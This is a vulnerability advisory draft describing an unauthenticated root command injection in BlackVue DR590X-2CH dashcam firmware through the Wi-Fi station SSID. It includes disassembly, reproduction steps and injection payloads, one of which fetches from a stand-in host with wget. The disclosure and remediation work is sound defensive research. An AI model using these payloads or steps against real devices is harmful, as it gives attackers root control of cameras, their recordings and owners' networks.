# [CVE-TBD] BlackVue DR590X-2CH 1.010 OS Command Injection (CWE-78)

## VulDB Submission Fields

- Vendor: BlackVue (Pittasoft)
- Product: DR590X-2CH
- Version or Commit: 1.010 (multilanguage build, 2026-01-07)
- Vulnerability: OS Command Injection (CWE-78)
- Advisory / Exploit URL: https://github.com/Zimo-666/cves/tree/main/blackvue-dr590x/01-upload-cgi-config-command-injection
- Description:

```
A command injection vulnerability was discovered in BlackVue DR590X-2CH firmware v1.010 (multilanguage build). The dashcam runs its main application /mnt/nand/System/main_app as root and generates /tmp/boa.conf with "User root" and "AuthType None" while it operates its own access point, so the Boa web server on TCP port 80 serves /upload.cgi without authentication. The multipart handler in upload.cgi maps the attacker-controlled FileType value ("config") to the relative path Config/config.ini, which is a symlink to /mnt/mmc/BlackVue/Config/config.ini on the SD card, and writes the uploaded body there. The station-mode SSID stored in that file is copied by readConfig (sub_1CD04) into the device configuration and later formatted into a shell command without quoting: the station check thread (sub_B2144, containing connect_router) executes sprintf(buf, "iwconfig wlan1 essid %s", configured_ssid) at 0xB3140 and hands the resulting string to sub_EF68C at 0xB314C, which places it on SysV message queue 35123; the helper /mnt/nand/System/sub_app receives the message and runs it through system() as root. An attacker on the dashcam access point (10.99.77.0/24) uploads a configuration whose [Wifi] sta_ssid is, for example, "x;id>/tmp/p;#" and broadcasts an access point with exactly that SSID (at most 32 bytes); when the dashcam scans while in station/cloud mode and matches the SSID, the shell executes "iwconfig wlan1 essid x;id>/tmp/p;#" and runs the injected command as root. Reproduction: POST the multipart body in poc-request.txt to http://<dashcam-ip>/upload.cgi (no credentials are required in the access-point profile; the server answers 200 and the SD-card file is replaced), then either reboot the device or wait for the configuration to be applied and expose an open access point named "x;id>/tmp/p;#". Impact: unauthenticated arbitrary command execution with root privileges on the dashcam. Proposed CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8).
```

---

## Technical Disclosure

### Summary

The BlackVue DR590X-2CH dashcam exposes an unauthenticated HTTP configuration upload
and feeds the stored Wi-Fi station SSID to a shell command interpreter without quoting.
`readConfig` in `/mnt/nand/System/main_app` copies the `[Wifi] sta_ssid` value from the
SD-card configuration, and the station check thread formats that value into
`iwconfig wlan1 essid <ssid>` and submits it to the firmware's own IPC executor, which
calls `system()` as `root`. Because the value is never validated or escaped, shell
metacharacters in the SSID are executed by the device.

### Affected Product and Firmware

- Vendor: BlackVue / Pittasoft (Korea)
- Product: DR590X-2CH (FHD 2-channel dashcam, Allwinner sunxi ARM32 platform)
- Firmware: v1.010, multilanguage build (`version.bin`: model `590X2`, config version
  1.070, build date 2026-01-07)
- Firmware archive SHA-256: `b11e93953dfdbe0c6386ac1cf775cc09a0c0468b38cd7f6a901f12dac7b29b19`
  (41,965,649 bytes, vendor download `dr590x-2ch-v1.010-eng.zip`)
- Components:
  - `/mnt/nand/System/main_app` - ARM32 EABI5, non-PIE, 1,692,972 bytes,
    SHA-256 `359ea2861ac7e701b5f8cc46e27bff0284d8ec419b2d8f4aa17eaca927425b03`
  - `/mnt/nand/System/www/upload.cgi` - ARM32 EABI5, 5,984 bytes,
    SHA-256 `599dcdce555dc99452be7e67ed91ac33c97b7fcd23e6a6dc34a1198e89d16665`
  - `/mnt/nand/System/sub_app` - ARM32 EABI5, 3,968 bytes,
    SHA-256 `e5520c0064d264ee29f3e9c1f28758c31243afaf5feb8433ba14d7f05c66d190`
  - `/mnt/nand/System/boa` - ARM32 EABI5, 97,812 bytes, server identification
    `DR590W`, built 2026-01-07,
    SHA-256 `a9206bb755aeb766d9efcc0d5ff8036c1a777880b48173de9000f5a171fc7728`
- Vendor firmware page: `https://media.blackvue.com/download/dr590x-2ch-firmware-multilanguage/`

### Vulnerability Details and Root Cause

`main_app` writes its Boa configuration in `sub_20ED8`. The file always contains
`User root`, `Group root`, `DocumentRoot /mnt/nand/System/www`,
`SinglePostLimit 100000000` and - depending on the Wi-Fi mode - `AuthType None` or
`AuthType Digest`:

```c
if ( a1[792] == 'S' && a1[793] == 'T' && a1[794] == 'A' && !a1[795] )
    strcpy(s, "AuthType Digest\n");
else
    strcpy(s, "AuthType None\n");
```

While the device runs its own access point the profile is `AuthType None`, and
`do_ap.sh` creates the symlinks `www/Config -> /mnt/mmc/BlackVue/Config` and
`www/Record -> /mnt/mmc/BlackVue/Record` before starting Boa.

`readConfig` (`sub_1CD04`, `/config.c`) parses `/mnt/mmc/BlackVue/Config/config.ini`
line by line. The station SSID is stored with a length cap but without character
validation:

```c
else if ( !strcmp(v11, "sta_ssid") )
{
    if ( v17 >= 64 ) v17 = 64;
    if ( v17 ) { memset(byte_8341A0, 0, sizeof(byte_8341A0)); memcpy(byte_8341A0, v8, v17); }
}
```

The station check thread (`StationCheckThread` body `sub_B2144`, which contains the
inlined `connect_router` from `station_chk_cld_wifi.c`) compares the configured
profiles against the scan results. For an open network it builds the shell command
directly from the configured SSID:

```
0x000b3130  movw  r1, #0x82cc          ; "iwconfig wlan1 essid %s"
0x000b3134  mov   r2, r4               ; configured SSID
0x000b3138  movt  r1, #0x18
0x000b313c  mov   r0, r8               ; destination buffer
0x000b3140  bl    sprintf
0x000b314c  bl    sub_EF68C            ; do_system
```

`sub_EF68C` copies the string into a SysV IPC message (`v5[0] = 1`, `v5[1] = wait`,
`strcpy(&v5[2], cmd)`) and sends it to queue 35123; `sub_app` is a `msgrcv` loop that
passes every received command to `system()`. Both processes run as `root`.

No quoting, escaping or character filtering is applied anywhere between the
configuration file and the shell.

### Authentication Requirements and Attack Conditions

- The HTTP upload requires no authentication while the device is in access-point mode
  (`AuthType None`, the factory profile), only network access to the dashcam AP
  (`10.99.77.1`, open by default).
- Applying the configuration requires a reboot, a Wi-Fi mode change or a configuration
  refresh performed by the BlackVue app; the value is also re-read at every boot.
- The injected value must equal the SSID of an access point visible to the dashcam
  scan and therefore must fit into an 802.11 SSID (up to 32 bytes). The attacker
  controls this by broadcasting an open access point with that SSID.
- Cloud/station mode is enabled by default in the shipped configuration
  (`[Cloud] CloudService=1`).

### Proof of Concept and Reproduction

`poc.py` performs the unauthenticated upload, and the raw request is provided in
`poc-request.txt`:

```bash
# 1. upload a configuration with an injected station SSID
python3 poc.py --host 10.99.77.1 --ssid 'x;wget -qO- http://192.0.2.10;#'

# 2. reboot the dashcam (power cycle) and broadcast an open AP with exactly that SSID
#    the device then runs:  iwconfig wlan1 essid x;wget -qO- http://192.0.2.10;#
#    and the injected command executes as root
```

A shorter payload that fits any SSID length is `x;id>/tmp/p;#` (13 bytes); the file
`/tmp/p` then contains `uid=0(root) gid=0(root)`.

### Observed Results and Evidence

| Step | Observation |
|---|---|
| Unauthenticated upload | `POST /upload.cgi` on the vendor Boa/upload.cgi (executed in a QEMU ARM chroot of the vendor rootfs) returned `HTTP/1.0 200 OK` and replaced `/mnt/mmc/BlackVue/Config/config.ini` with the uploaded body containing `sta_ssid=x;id>/tmp/ssid_poc;#` |
| Command construction | the vendor `main_app` disassembly contains `sprintf(buf, "iwconfig wlan1 essid %s", ssid)` at `0xB3140` immediately followed by `sub_EF68C(buf, 0)` at `0xB314C` |
| Command execution | the vendor `sub_app` executed a message delivered to SysV queue 35123 (`id > /tmp/ipc_poc`) and produced `uid=0(root) gid=0(root)` |
| Filtering | no character filter exists on the `sta_ssid` path (only the 64-byte length cap) |

The end-to-end sequence (device scanning the attacker access point and executing the
command) was reproduced at the level of the individual firmware components; physical
dashcam hardware was not available to this research.

### Security Impact

An unauthenticated attacker on the dashcam Wi-Fi network obtains arbitrary command
execution as `root`: full control of the camera, its recordings and the SD card, and -
once the dashcam is configured to join an attacker access point - a foothold on the
owner's network.

### CWE and CVSS Vector

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
  ('OS Command Injection')
- CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8)

### Related CVEs / Novelty Analysis

- CVE-2025-7075 / CVE-2025-7076 (DR590X, 2025) cover the unauthenticated upload and
  configuration modification. Those reports stop at the file write; this finding is a
  distinct defect in the configuration consumer and remains exploitable after the
  upload endpoint is protected.
- CVE-2023-27746 / CVE-2023-27747 / CVE-2023-27748 affect the DR750-2CH LTE (weak
  default Wi-Fi passphrase, unauthenticated web server, unauthenticated FOTA). None
  of them covers the station-SSID command injection.
- Search of NVD, CVE.org, JVN, VulDB and the public BlackVue research (eyJhb 2022/2023,
  Geo Chen 2025, Black Hat Asia 2025 dashcam study) found no report of this command
  injection for the DR590X.

### Suggested Remediation

* Validate the station SSID against a strict allow-list before use, or pass it to
  `iwconfig` through `execve()` without a shell.
* Quote the value (single quotes with embedded quote escaping) if a shell must be used.
* Do not keep the unauthenticated `upload.cgi` endpoint enabled in access-point mode.
* Add authentication to the configuration write path and sign configuration uploads.

### Disclosure Status

Vendor notification and CVE assignment are pending. No public advisory exists; the
Advisory URL is a placeholder. This document is a coordinated-disclosure draft.
